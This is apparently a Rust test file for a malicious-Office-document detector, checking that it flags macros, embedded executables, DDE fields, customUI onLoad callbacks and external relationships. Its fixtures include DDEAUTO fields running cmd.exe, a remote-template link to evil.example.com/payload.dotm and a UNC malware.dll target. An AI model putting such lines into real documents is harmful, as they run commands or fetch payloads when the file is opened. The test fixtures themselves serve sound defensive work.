use super::*;
use crate::output::{Metrics, Values};
use std::io::Cursor;
use std::io::Write;
use zip::CompressionMethod;
use zip::write::{SimpleFileOptions, ZipWriter};

/// Word maps `bin` to the VBA project type by `Default` in every
/// macro-enabled document, which also covers an embedded OLE object with
/// no override. The `vbaProject` relationship names the real project.
#[test]
fn default_bin_mapping_does_not_make_ole_objects_macros() {
    let ct = r#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
</Types>"#;
    let root_rels = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"#;
    let doc_rels = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>
  <Relationship Id="rId7" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("_rels/.rels", root_rels.as_bytes()),
        ("word/document.xml", b"<w:document/>"),
        ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
        ("word/embeddings/oleObject1.bin", b"not a project"),
        ("word/vbaProject.bin", b"\x01\x16\x03\x00fake-macro-blob"),
    ]);
    let (v, m) = run(&z);
    let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
    assert_eq!(macros.len(), 1, "{macros:?}");
    assert_eq!(macros[0].as_str(), Some("word/vbaProject.bin"));
    assert_eq!(m.get("office.macro_count"), Some(1.0));
}
fn run(bytes: &[u8]) -> (Values, Metrics) {
    let (v, m, _) = run_with_errors(bytes);
    (v, m)
}

fn run_with_errors(bytes: &[u8]) -> (Values, Metrics, Errors) {
    let mut v = Values::new();
    let mut m = Metrics::new();
    let mut e = Errors::new();
    if let Ok(mut zip) = crate::formats::zip::open_archive(bytes) {
        extract_from_archive(&mut zip, &mut v, &mut m, &mut e);
    }
    (v, m, e)
}

/// `[Content_Types].xml` with `n` extra `Override` entries ahead of the
/// document-type one, the way a package with many parts lists them.
fn content_types_with_overrides(n: usize) -> String {
    let mut xml = String::from(
        r#"<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">"#,
    );
    for i in 0..n {
        xml.push_str(&format!(
            r#"<Override PartName="/word/media/image{i}.png" ContentType="image/png"/>"#
        ));
    }
    xml.push_str(r#"<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#);
    xml
}

fn build_ooxml(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::<u8>::new());
    {
        let mut w = ZipWriter::new(&mut buf);
        let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
        for (path, body) in members {
            w.start_file(*path, opts).unwrap();
            w.write_all(body).unwrap();
        }
        w.finish().unwrap();
    }
    buf.into_inner()
}

const CONTENT_TYPES_DOCX: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"#;

const CONTENT_TYPES_XLSX: &str = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>"#;

const CORE_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties
    xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:dcterms="http://purl.org/dc/terms/">
  <dc:title>Quarterly Report</dc:title>
  <dc:creator>Alice</dc:creator>
  <cp:lastModifiedBy>Bob</cp:lastModifiedBy>
  <dcterms:created>2024-01-15T08:00:00Z</dcterms:created>
  <dcterms:modified>2024-01-16T09:30:00Z</dcterms:modified>
  <dc:description>FY24 numbers</dc:description>
</cp:coreProperties>"#;

const APP_XML: &str = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>Microsoft Macintosh Word</Application>
  <Company>Acme Corp</Company>
</Properties>"#;

#[test]
fn detects_docx_kind() {
    let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes())]);
    let (v, _) = run(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
}

#[test]
fn detects_xlsx_kind() {
    let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes())]);
    let (v, _) = run(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("xlsx"));
}

#[test]
fn extracts_core_properties() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("docProps/core.xml", CORE_XML.as_bytes()),
    ]);
    let (v, _) = run(&z);
    assert_eq!(
        v.get("office.title").and_then(|x| x.as_str()),
        Some("Quarterly Report")
    );
    assert_eq!(
        v.get("office.creator").and_then(|x| x.as_str()),
        Some("Alice")
    );
    assert_eq!(
        v.get("office.last_modified_by").and_then(|x| x.as_str()),
        Some("Bob")
    );
    assert_eq!(
        v.get("office.created").and_then(|x| x.as_str()),
        Some("2024-01-15T08:00:00Z")
    );
    assert_eq!(
        v.get("office.modified").and_then(|x| x.as_str()),
        Some("2024-01-16T09:30:00Z")
    );
}

#[test]
fn extracts_application_and_company() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("docProps/app.xml", APP_XML.as_bytes()),
    ]);
    let (v, _) = run(&z);
    assert_eq!(
        v.get("office.application").and_then(|x| x.as_str()),
        Some("Microsoft Macintosh Word")
    );
    assert_eq!(
        v.get("office.company").and_then(|x| x.as_str()),
        Some("Acme Corp")
    );
}

#[test]
fn reports_the_uncompressed_size_of_the_vba_project() {
    // The document stays small because padding compresses away, so the
    // project's own size is the only place the padding is visible. One
    // maldoc family ships a 2.3 MB VBA project inside a 68 KB .docx.
    let blob = vec![b'A'; 40_000];
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/vbaProject.bin", &blob),
    ]);
    let (_, m) = run(&z);
    // The uncompressed size, not the stored size -- the whole point is
    // that it survives whatever the container did to it.
    assert_eq!(m.get("office.vba.project_size"), Some(40_000.0));
}

#[test]
fn no_vba_project_size_without_macros() {
    let z = build_ooxml(&[("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes())]);
    let (_, m) = run(&z);
    assert_eq!(m.get("office.vba.project_size"), None);
}

#[test]
fn flags_macros_when_vba_project_present() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/vbaProject.bin", b"\x01\x16\x03\x00fake-macro-blob"),
    ]);
    let (v, m) = run(&z);
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"macros"));
    assert_eq!(m.get("office.macro_count"), Some(1.0));
    let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
    assert_eq!(macros[0].as_str(), Some("word/vbaProject.bin"));
}

#[test]
fn flags_ole_objects() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/embeddings/oleObject1.bin", b"junk"),
    ]);
    let (v, _) = run(&z);
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"ole_objects"));
}

#[test]
fn flags_xlsx_external_links() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
        ("xl/externalLinks/externalLink1.xml", b"<xml />"),
    ]);
    let (v, _) = run(&z);
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"external_links"));
}

#[test]
fn non_ooxml_zip_silent() {
    // A regular zip with no [Content_Types].xml — should NOT
    // emit any `office.*` keys.
    let z = build_ooxml(&[("hello.txt", b"world")]);
    let (v, _) = run(&z);
    assert!(v.get("office.kind").is_none());
    assert!(v.get("office.title").is_none());
}

#[test]
fn malformed_core_and_rels_are_recorded() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("docProps/core.xml", b"<not-actually-xml"),
        ("word/_rels/document.xml.rels", b"<Relationships"),
    ]);
    let (v, _, e) = run_with_errors(&z);
    // Kind still set; core properties missing, and the loss is reported.
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
    assert!(v.get("office.title").is_none());
    let messages: Vec<&str> = e.iter().map(|x| x.message.as_str()).collect();
    assert!(e.iter().all(|x| x.stage == Stage::OoxmlParse), "{e:?}");
    assert!(messages.iter().any(|m| m.starts_with("docProps/core.xml")));
    assert!(
        messages
            .iter()
            .any(|m| m.starts_with("word/_rels/document.xml.rels"))
    );
}

/// A package with many parts has a `[Content_Types].xml` well past 16 KiB.
/// Cut off at that size it failed to parse, and the whole `office.*` layer
/// -- kind, macros, relationships -- vanished without an error.
#[test]
fn large_content_types_keeps_the_office_layer() {
    let ct = content_types_with_overrides(2_000);
    assert!(ct.len() > 64 * 1024);
    let z = build_ooxml(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("word/vbaProject.bin", b"\x01\x16\x03\x00fake-macro-blob"),
    ]);
    let (v, m, e) = run_with_errors(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
    assert_eq!(m.get("office.macro_count"), Some(1.0));
    assert!(e.is_empty(), "{e:?}");
}

/// A long document is routine: its unscanned part is a recorded limit,
/// not a parse error that error-count traits would read as a failure.
#[test]
fn oversized_body_part_is_a_limit_not_an_error() {
    let ct = content_types_with_overrides(0);
    let body = format!(
        "<w:document>{}</w:document>",
        " ".repeat(MAX_SCAN_PART_BYTES as usize)
    );
    let z = build_ooxml(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("word/document.xml", body.as_bytes()),
    ]);
    let (v, _, e) = run_with_errors(&z);
    assert!(e.is_empty(), "{e:?}");
    let limits = v.get("office.limits").and_then(|x| x.as_array()).unwrap();
    assert_eq!(limits[0]["stage"].as_str(), Some("part-scan"));
}

/// The DDE and customUI scans share one parse per part.
#[test]
fn dde_field_and_custom_ui_onload_are_found() {
    let ct = content_types_with_overrides(0);
    let doc = r#"<w:document xmlns:w="w"><w:body><w:fldSimple w:instr="DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc&quot;"/></w:body></w:document>"#;
    let ui =
        r#"<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onLoad="Boom"/>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("word/document.xml", doc.as_bytes()),
        ("customUI/customUI.xml", ui.as_bytes()),
    ]);
    let (v, m) = run(&z);
    let dde = v
        .get("office.dde_links")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(dde.len(), 1);
    assert_eq!(dde[0]["source"].as_str(), Some("word/document.xml"));
    assert_eq!(m.get("office.custom_ui_onload_count"), Some(1.0));
}

/// Thousands of parts used to be inflated and parsed twice each. The scan
/// reads a bounded total; the parts past it are a recorded limit.
#[test]
fn xml_part_scan_shares_one_byte_budget() {
    let ct = content_types_with_overrides(0);
    let part = format!("<a>{}</a>", " ".repeat(1_000_000));
    let count = (MAX_SCAN_TOTAL_BYTES as usize / part.len()) + 3;
    let names: Vec<String> = (0..count).map(|i| format!("word/part{i}.xml")).collect();
    let mut members: Vec<(&str, &[u8])> = vec![("[Content_Types].xml", ct.as_bytes())];
    members.extend(names.iter().map(|n| (n.as_str(), part.as_bytes())));
    let z = build_ooxml(&members);
    let (v, _, e) = run_with_errors(&z);
    assert!(e.is_empty(), "{e:?}");
    let limits = v.get("office.limits").and_then(|x| x.as_array()).unwrap();
    assert!(
        limits
            .iter()
            .any(|l| l["stage"].as_str() == Some("part-scan-budget")),
        "{limits:?}"
    );
}

/// Past the read cap the layer is still lost, but no longer silently.
#[test]
fn oversized_content_types_is_recorded() {
    let mut ct = content_types_with_overrides(0);
    let padding = " ".repeat(MAX_PART_BYTES as usize);
    ct.insert_str(ct.len() - "</Types>".len(), &padding);
    let z = build_ooxml(&[("[Content_Types].xml", ct.as_bytes())]);
    let (v, _, e) = run_with_errors(&z);
    assert!(v.get("office.kind").is_none());
    let entry = e.iter().next().expect("oversized part recorded");
    assert_eq!(entry.kind, DiagnosticKind::Truncated);
    assert_eq!(entry.stage, Stage::OoxmlParse);
    assert!(entry.message.starts_with("[Content_Types].xml"));
}

#[test]
fn unknown_ooxml_falls_back_to_generic_label() {
    // Visio-style package — has [Content_Types].xml but no
    // word/xl/ppt content type. Should still emit `office.kind`
    // with the fallback "ooxml" label.
    let visio_ct = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/visio/document.xml"
    ContentType="application/vnd.ms-visio.drawing.main+xml"/>
</Types>"#;
    let z = build_ooxml(&[("[Content_Types].xml", visio_ct.as_bytes())]);
    let (v, _) = run(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("ooxml"));
}

#[test]
fn empty_core_xml_omits_values() {
    // Empty docProps/core.xml shouldn't emit office.
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("docProps/core.xml", b"<cp:coreProperties xmlns:cp=\"x\"/>"),
    ]);
    let (v, _) = run(&z);
    assert!(v.get("office.title").is_none());
}

#[test]
fn enumerates_embedded_pe_executable() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        (
            "word/embeddings/oleObject1.bin",
            b"MZ\x90\x00\x03\x00\x00\x00fake-pe",
        ),
    ]);
    let (v, m) = run(&z);
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded.len(), 1);
    assert_eq!(embedded[0]["kind"].as_str(), Some("pe"));
    assert_eq!(
        embedded[0]["filename"].as_str(),
        Some("word/embeddings/oleObject1.bin")
    );
    assert_eq!(m.get("office.embedded_count"), Some(1.0));
    assert_eq!(m.get("office.embedded_executable_count"), Some(1.0));
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"embedded_executable"));
}

#[test]
fn enumerates_embedded_elf_payload() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
        (
            "xl/embeddings/oleObject1.bin",
            b"\x7fELF\x02\x01\x01\x00rest-of-elf",
        ),
    ]);
    let (v, _) = run(&z);
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded[0]["kind"].as_str(), Some("elf"));
}

#[test]
fn enumerates_embedded_macho_payload() {
    // Mach-O 64-bit little-endian magic: CF FA ED FE
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        (
            "word/embeddings/oleObject1.bin",
            b"\xCF\xFA\xED\xFE\x07\x00\x00\x01",
        ),
    ]);
    let (v, _) = run(&z);
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded[0]["kind"].as_str(), Some("macho"));
}

#[test]
fn benign_embedding_doesnt_flag_executable() {
    // A non-executable payload (e.g. an embedded image or text)
    // surfaces in `office.embedded` but doesn't bump the
    // executable count or set the `embedded_executable` feature.
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/embeddings/image1.bin", b"not an executable"),
    ]);
    let (v, m) = run(&z);
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded.len(), 1);
    assert!(embedded[0].get("kind").is_none());
    assert!(m.get("office.embedded_executable_count").is_none());
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"ole_objects"));
    assert!(!names.contains(&"embedded_executable"));
}

#[test]
fn multiple_embeddings_with_mixed_kinds() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        (
            "word/embeddings/oleObject1.bin",
            b"MZ\x90\x00\x03\x00fake-pe",
        ),
        ("word/embeddings/oleObject2.bin", b"\x7fELFfake-elf"),
        ("word/embeddings/image1.bin", b"not-an-exec"),
    ]);
    let (_, m) = run(&z);
    assert_eq!(m.get("office.embedded_count"), Some(3.0));
    assert_eq!(m.get("office.embedded_executable_count"), Some(2.0));
}

#[test]
fn embedded_classifier_handles_canonical_magics() {
    assert_eq!(embedded_kind(b"MZ\x90\x00"), Some("pe"));
    assert_eq!(embedded_kind(b"\x7fELF\x02"), Some("elf"));
    assert_eq!(embedded_kind(b"\xFE\xED\xFA\xCE"), Some("macho"));
    assert_eq!(embedded_kind(b"\xCF\xFA\xED\xFE"), Some("macho"));
    assert_eq!(embedded_kind(b"PK\x03\x04"), Some("zip"));
    assert_eq!(
        embedded_kind(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"),
        Some("ole2")
    );
    assert_eq!(embedded_kind(b"random"), None);
    // Too-short input must not panic.
    assert_eq!(embedded_kind(b""), None);
    assert_eq!(embedded_kind(b"M"), None);
}

#[test]
fn flags_external_relationship_template_injection() {
    // The classic T1221 template-injection shape: a `.rels` file
    // points the document's attached template at a remote URL,
    // which Word fetches on open.
    let inject_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="https://evil.example.com/payload.dotm"
    TargetMode="External"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/_rels/settings.xml.rels", inject_rels.as_bytes()),
    ]);
    let (v, m) = run(&z);
    let rels = v
        .get("office.external_relationships")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(rels.len(), 1);
    // Type is the schema-suffix only.
    assert_eq!(rels[0]["type"].as_str(), Some("attachedTemplate"));
    assert_eq!(
        rels[0]["target"].as_str(),
        Some("https://evil.example.com/payload.dotm")
    );
    assert_eq!(rels[0]["mode"].as_str(), Some("External"));
    assert_eq!(
        rels[0]["source"].as_str(),
        Some("word/_rels/settings.xml.rels")
    );
    assert_eq!(m.get("office.external_relationship_count"), Some(1.0));
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"external_relationships"));
}

#[test]
fn local_relationships_dont_count_as_external() {
    // The default `word/_rels/document.xml.rels` is full of
    // local relative paths — those are noise, not signal.
    let local_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/_rels/document.xml.rels", local_rels.as_bytes()),
    ]);
    let (v, _) = run(&z);
    assert!(v.get("office.external_relationships").is_none());
}

#[test]
fn unc_paths_count_as_external() {
    let unc_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="\\10.0.0.5\share\malware.dll"
    TargetMode="External"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/_rels/document.xml.rels", unc_rels.as_bytes()),
    ]);
    let (v, _) = run(&z);
    let rels = v
        .get("office.external_relationships")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(rels[0]["type"].as_str(), Some("oleObject"));
    assert!(
        rels[0]["target"]
            .as_str()
            .unwrap()
            .starts_with("\\\\10.0.0.5")
    );
}

#[test]
fn external_target_classifier_drops_local() {
    assert!(is_external_target("https://evil.com/x"));
    assert!(is_external_target("http://a"));
    assert!(is_external_target("file:///etc/passwd"));
    assert!(is_external_target("\\\\server\\share"));
    assert!(is_external_target("//server/share"));
    assert!(!is_external_target("styles.xml"));
    assert!(!is_external_target("theme/theme1.xml"));
    assert!(!is_external_target(""));
    // Bare "//" without a server isn't actually external; the
    // classifier accepts it since real attacks use this shape
    // and the false-positive cost is low.
    assert!(is_external_target("//"));
}

#[test]
fn macros_and_ole_combine_in_features() {
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/vbaProject.bin", b"macro"),
        ("word/embeddings/oleObject1.bin", b"ole"),
    ]);
    let (v, _) = run(&z);
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"macros"));
    assert!(names.contains(&"ole_objects"));
}
#[test]
fn detects_macro_project_from_content_type_nonstandard_path() {
    let ct = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/new_name.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("xl/new_name.bin", b"macro"),
    ]);
    let (v, m) = run(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("xlsx"));
    let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
    assert_eq!(macros[0].as_str(), Some("xl/new_name.bin"));
    assert_eq!(m.get("office.macro_count"), Some(1.0));
}

#[test]
fn detects_controls_and_packages_from_relationships() {
    let rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/>
  <Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="embeddings/package1.bin"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
        ("xl/_rels/workbook.xml.rels", rels.as_bytes()),
        ("xl/activeX/activeX1.xml", b"<ax />"),
        ("xl/embeddings/package1.bin", b"PK\x03\x04zip"),
    ]);
    let (v, m) = run(&z);
    let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"active_x"));
    assert!(names.contains(&"embedded_packages"));
    let controls = v.get("office.controls").and_then(|x| x.as_array()).unwrap();
    assert_eq!(
        controls[0]["filename"].as_str(),
        Some("xl/activeX/activeX1.xml")
    );
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded[0]["relationship_type"].as_str(), Some("package"));
    assert_eq!(embedded[0]["kind"].as_str(), Some("zip"));
    assert_eq!(m.get("office.control_count"), Some(1.0));
}

#[test]
fn target_mode_external_counts_without_url_shape() {
    let rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="template.dotm" TargetMode="External"/>
</Relationships>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/_rels/settings.xml.rels", rels.as_bytes()),
    ]);
    let (v, _) = run(&z);
    let rels = v
        .get("office.external_relationships")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(rels[0]["target"].as_str(), Some("template.dotm"));
    assert_eq!(rels[0]["mode"].as_str(), Some("External"));
}

#[test]
fn extracts_word_and_excel_dde_links() {
    let doc = r#"<w:document xmlns:w="w"><w:fldSimple w:instr="DDEAUTO c:\windows\system32\cmd.exe /c calc"/></w:document>"#;
    let sheet = r#"<worksheet><ddeLink ddeService="cmd" ddeTopic="/c calc"/></worksheet>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/document.xml", doc.as_bytes()),
        ("xl/externalLinks/externalLink1.xml", sheet.as_bytes()),
    ]);
    let (v, m) = run(&z);
    let links = v
        .get("office.dde_links")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(links.len(), 2);
    assert_eq!(m.get("office.dde_link_count"), Some(2.0));
}

#[test]
fn extracts_custom_ui_onload_callbacks() {
    let custom = r#"<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onLoad="AutoOpen"/>"#;
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("customUI/customUI.xml", custom.as_bytes()),
    ]);
    let (v, _) = run(&z);
    let callbacks = v
        .get("office.custom_ui_onload")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(callbacks[0]["on_load"].as_str(), Some("AutoOpen"));
}

#[test]
fn decodes_utf16_xml_entries() {
    let mut utf16 = vec![0xFF, 0xFE];
    for unit in CONTENT_TYPES_DOCX.encode_utf16() {
        utf16.extend_from_slice(&unit.to_le_bytes());
    }
    let z = build_ooxml(&[("[Content_Types].xml", &utf16)]);
    let (v, _) = run(&z);
    assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
}

/// Relationship parts are each read in full, so a package of many large
/// ones inflated and kept everything. Past the relationship cap, and past
/// the byte budget across parts, the rest is a recorded limit.
#[test]
fn relationship_parts_share_one_budget() {
    // An external target, about as short as one can be written.
    let rel = r#"<Relationship Target="hh:x"/>"#;
    let many = format!(
        "<Relationships>{}</Relationships>",
        rel.repeat(MAX_RELATIONSHIPS + 10)
    );
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/_rels/document.xml.rels", many.as_bytes()),
    ]);
    let (v, m, e) = run_with_errors(&z);
    assert!(e.is_empty(), "{e:?}");
    assert_eq!(
        m.get("office.external_relationship_count"),
        Some(MAX_RELATIONSHIPS as f64)
    );
    let limits = v.get("office.limits").and_then(|x| x.as_array()).unwrap();
    assert!(
        limits
            .iter()
            .any(|l| l["stage"].as_str() == Some("rels-budget")),
        "{limits:?}"
    );

    let part = format!("<Relationships>{}</Relationships>", " ".repeat(3 << 20));
    let count = (MAX_RELS_TOTAL_BYTES as usize / part.len()) + 3;
    let names: Vec<String> = (0..count).map(|i| format!("p{i}/_rels/x.rels")).collect();
    let mut members: Vec<(&str, &[u8])> =
        vec![("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes())];
    members.extend(names.iter().map(|n| (n.as_str(), part.as_bytes())));
    let (v, _, e) = run_with_errors(&build_ooxml(&members));
    assert!(e.is_empty(), "{e:?}");
    let limits = v.get("office.limits").and_then(|x| x.as_array()).unwrap();
    let reason = limits
        .iter()
        .find(|l| l["stage"].as_str() == Some("rels-budget"))
        .and_then(|l| l["reason"].as_str())
        .unwrap();
    assert!(reason.starts_with("2 relationship part(s)"), "{reason}");
}

/// Relationships naming one embedded part again and again update its one
/// entry, found by key rather than by a scan of every entry.
#[test]
fn repeated_embedding_relationships_update_one_entry() {
    let mut rels = String::from("<Relationships>");
    for i in 0..20_000 {
        rels.push_str(&format!(
            r#"<Relationship Id="e{i}" Type="t/oleObject" Target="embeddings/o{}.bin"/>"#,
            i % 10_000
        ));
    }
    rels.push_str("</Relationships>");
    let z = build_ooxml(&[
        ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
        ("word/document.xml", b"<w:document/>"),
        ("word/_rels/document.xml.rels", rels.as_bytes()),
    ]);
    let started = std::time::Instant::now();
    let (v, m) = run(&z);
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
    assert_eq!(m.get("office.embedded_count"), Some(10_000.0));
    let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
    assert_eq!(embedded[0]["filename"], "word/embeddings/o0.bin");
